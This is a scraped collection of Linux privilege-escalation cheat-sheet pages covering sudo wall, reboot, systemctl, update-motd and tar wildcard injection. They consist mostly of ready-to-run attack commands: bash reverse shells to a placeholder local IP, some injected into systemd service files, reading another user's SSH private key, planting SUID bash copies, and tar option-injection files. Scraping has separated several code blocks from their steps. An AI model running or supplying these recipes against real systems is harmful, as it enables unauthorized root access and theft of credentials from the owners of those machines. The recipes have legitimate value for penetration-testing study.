![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wall-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (ALL) NOPASSWD: wall
    Copied!

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wall-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wall-privilege-escalation/#exploitation)

Copy

    # Reverse shell
    sudo wall "$(bash -c 'bash -i >& /dev/tcp/<local-ip>/<local-port> 0>&1')"
    
    # Gets a SSH private key of another user
    sudo wall "$(cat /home/user/.ssh/id_rsa)"

# Sudo Reboot Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-reboot-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/#investigation)

Copy

    sudo -l
    
    (ALL) NOPASSWD: /usr/sbin/reboot
    Copied!

If we can execute **"reboot"** command as root, we can escalate to privileges.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-reboot-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/#exploitation)

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-reboot-privilege-escalation#id-1.-find-service-config-files-which-are-writable)

[1\. Find Service Config Files Which Are Writablearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/#1.-find-service-config-files-which-are-writable)

We need to look for the system service config file which are writable.

Copy

    find / -writable -name "*.service" 2>/dev/null
    
    /etc/systemd/system/example.service
    Copied!

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-reboot-privilege-escalation#id-2.-insert-a-payload)

[2\. Insert a Payloadarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/#2.-insert-a-payload)

If we find a writable file, we can inject a payload into **Service.ExecStart**.

Copy

    # /etc/systemd/systm/example.service
    [Unit]
    Description=Zeno monitoring
    
    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'cp /bin/bash /home/<username>/bash; chmod +xs /home/<username>/bash'
    
    [Install]
    WantedBy=multi-user.target
    Copied!

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-reboot-privilege-escalation#id-3.-reboot-and-get-a-root-shell)

[3\. Reboot and Get a Root Shellarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-reboot-privilege-escalation/#3.-reboot-and-get-a-root-shell)

Now reboot as root.

After the system rebooted, the command in the ExecStart will be executed. Now we should get a root shell by executing the copied bash command.

[PreviousSudo Privilege Escalation by Overriding Shared Librarychevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-privilege-escalation-by-overriding-shared-library)
[NextSudo Screen Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-screen-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-reboot-privilege-escalation#investigation)

    sudo /usr/sbin/reboot
    Copied!

# Update-Motd Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/update-motd-privilege-escalation#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/update-motd-privilege-escalation/#investigation)

Copy

    ls -al /etc/update-motd.d/
    Copied!

If we have permission to modify files in this directory, we can inject arbitrary code and execute when logging in.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/update-motd-privilege-escalation#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/update-motd-privilege-escalation/#exploitation)

Run the following code to copy bash binary and give `**suid**` to this file. Replace `**<username>**` with your current user name.

Copy

    echo "cp /bin/bash /home/<username>/bash && chmod u+s /home/<username>/bash" >> /etc/update-motd.d/00-header
    Copied!

After that, log out and log in again with SSH. The above script should be executed. Now execute the following command under `**/home/<username>**`.

Copy

    ./bash -p

# Tar Wildcard Injection PrivEsc | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/tar-wildcard-injection-privesc#investigation)

[Investigationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/tar-wildcard-injection-privesc/#investigation)

For example, below command can be executed as root.

Copy

    sudo -l
    
    (root) NOPASSWD: /opt/backup/baskup.sh
    Copied!

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/tar-wildcard-injection-privesc#check-if-the-file-contains-tar-command-with-wildcards)

[Check If the File Contains Tar Command with Wildcardsarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/tar-wildcard-injection-privesc/#check-if-the-file-contains-tar-command-with-wildcards)

We need to check the content in the file.

Copy

    cat /opt/backup/backup.sh
    
    # -cf: create an archived file
    tar -cf backup.tar *
    Copied!

The above **tar** command means that it creates an arvhived file from any input file because it passes **wildcard (\*)**.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/tar-wildcard-injection-privesc#exploitation)

[Exploitationarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/tar-wildcard-injection-privesc/#exploitation)

Now create a payload for privilege escalation.

We've created three files.

Now execute **"tar"** command as root with wildcard.

Wait until **"tar"** command will be executed. After a while, we should see the current user switch to root.

[PreviousSudoedit Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudoedit-privilege-escalation)
[NextUpdate-Motd Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/update-motd-privilege-escalation)

Last updated 2 years ago

*   [Investigation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/tar-wildcard-injection-privesc#investigation)
    
*   [Exploitation](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/tar-wildcard-injection-privesc#exploitation)
    

Copy

    cd /opt/backup
    echo -e '#!/bin/bash\n/bin/bash' > shell.sh
    echo "" > "--checkpoint-action=exec=sh shell.sh"
    echo "" > --checkpoint=1
    Copied!

Copy

    ls /opt/backup
    
    shell.sh  '--checkpoint-action=exec=sh shell.sh'  '--checkpoint=1'
    Copied!

Copy

    sudo tar -cf example.tar *
    Copied!

Copy

    whoami
    root

# Sudo Systemctl Privilege Escalation | Linux Privilege Escalation

![Page cover](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/~gitbook/image?url=https%3A%2F%2F3408591498-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FHodth0V9wekiurVVG6z3%252Fuploads%252FKm5579XeDsdzyyyydF5c%252Fcoruja.jpg%3Falt%3Dmedia%26token%3D3dadb583-a5af-47c8-8263-112f40430a2e&width=1248&dpr=3&quality=100&sign=c6812a4e&sv=2)

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-systemctl-privilege-escalation#modify-configurations)

[Modify Configurationsarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/#modify-configurations)

Copy

    sudo -l
    
    (ALL) NOPASSWD: systemctl
    Copied!

If we can run **"systemctl"** command as root, and we can edit the config file, then we might be a root user.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-systemctl-privilege-escalation#id-1.-update-the-config-file)

[1\. Update the Config Filearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/#1.-update-the-config-file)

We need to insert the payload for reverse shell to get a root shell into the /etc/systemd/system/example.service.

Copy

    [Unit]
    This is an example service.
    
    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<local-ip>/4444 0>&1'
    
    [Install]
    WantedBy=multi-user.target
    Copied!

Replace **“<local-ip>”** with your local ip address.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-systemctl-privilege-escalation#id-2.-start-listener-in-local-machine)

[2\. Start Listener in Local Machinearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/#2.-start-listener-in-local-machine)

Then start listener for getting a root shell.

#### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-systemctl-privilege-escalation#id-3.-restart-the-service)

[3\. Restart the Servicearrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/#3.-restart-the-service)

Reload the daemon and restart.

Now we should get a shell in local machine.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-systemctl-privilege-escalation#spawn-shell-in-the-pager)

[Spawn Shell in the Pagerarrow-up-right](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/#spawn-shell-in-the-pager)

If we can execute `**systemctl status**` as root, we can spawn another shell in the pager. Just run the command with `sudo`.

Then enter the following command in the pager like `less`.

Spawning the shell, then we can get another user shell.

### 

[hashtag](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-systemctl-privilege-escalation#references)

References

*   [https://gtfobins.github.io/gtfobins/systemctl/arrow-up-right](https://gtfobins.github.io/gtfobins/systemctl/)
    

[PreviousSudo Shutdown, Poweroff Privilege Escalationchevron-left](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-shutdown-poweroff-privilege-escalation)
[NextSudo Tee Privilege Escalationchevron-right](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-tee-privilege-escalation)

Last updated 2 years ago

*   [Modify Configurations](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-systemctl-privilege-escalation#modify-configurations)
    
*   [Spawn Shell in the Pager](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-systemctl-privilege-escalation#spawn-shell-in-the-pager)
    
*   [References](https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-systemctl-privilege-escalation#references)
    

Copy

    nc -lvnp 4444
    Copied!

Copy

    sudo systemctl daemon-reload
    sudo systemctl restart example.service
    Copied!

Copy

    sudo -l
    
    # output
    (ALL) NOPASSWD: systemctl status example.service
    Copied!

Copy

    sudo systemctl status example.service
    Copied!

Copy

    !sh
    Copied!
